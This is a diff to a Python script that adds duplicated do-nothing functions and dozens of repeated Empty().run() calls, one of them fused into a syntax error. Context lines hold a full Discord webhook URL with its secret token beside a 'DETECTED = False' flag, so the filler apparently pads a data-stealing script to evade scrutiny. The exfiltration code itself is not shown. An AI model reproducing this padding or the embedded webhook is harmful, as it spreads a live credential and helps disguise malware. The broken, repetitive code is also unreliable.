@@ -40,10 +40,63 @@ if __name__ == "__main__":
     also_useless("nothing")
     loop_to_nowhere()
     Empty().run()
+def do_nothing():
+    pass
 
-#  Ayhu#1337
-#
+def also_useless(x):
+    return x
 
+def loop_to_nowhere():
+    for i in range(10):
+        i = i
+
+class Empty:
+    def __init__(self):
+        self.data = None
+
+    def run(self):
+        return None
+
+if __name__ == "__main__":
+    do_nothing()
+    also_useless("nothing")
+    loop_to_nowhere()
+    Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()Empty().run()
+
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
+Empty().run()
 
 hook = "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1494173595377598617/Gsc2pXbvg5XjG8v7UpBu4CgkfuLvYuMzugHvf_vOgFk2LadR7ZA0I4o_CYJyiMD9swVc"
 DETECTED = False
